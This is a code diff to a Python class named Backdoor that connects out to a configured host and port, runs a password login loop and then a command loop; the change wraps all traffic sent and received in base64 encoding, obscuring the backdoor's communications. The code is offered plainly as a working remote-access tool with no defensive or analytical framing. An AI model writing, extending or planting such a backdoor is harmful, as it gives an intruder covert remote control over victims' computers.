@@ -2,6 +2,7 @@ import socket
 import subprocess
 import time
 import os
+import base64
 
 class Backdoor(object):
     def __init__(self, host, port, passwd):
@@ -11,16 +12,26 @@ class Backdoor(object):
         self.__next_msg = list()
         self.__sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
+    def __encode(self, data):
+        encoded = data.encode()
+        encoded = base64.b64encode(encoded)
+        return encoded
+
+    def __decode(self, data):
+        decoded = base64.b64decode(data)
+        decoded = decoded.decode()
+        return decoded
+
     def __msg(self, msg):
         self.__next_msg.append(msg)
 
     def __send(self):
         msg = '\n'.join(self.__next_msg)
         self.__next_msg.clear()
-        self.__sock.send(msg.encode())
+        self.__sock.send(self.__encode(msg))
 
     def __recv(self):
-        return self.__sock.recv(1024).decode()
+        return self.__decode(self.__sock.recv(1024))
 
     def __send_and_recv(self):
         self.__send()
@@ -78,6 +89,7 @@ class Backdoor(object):
         self.__sock.connect((self.__host, self.__port))
         if not self.login_loop():
             return
+        
         self.cmd_loop()
 
 
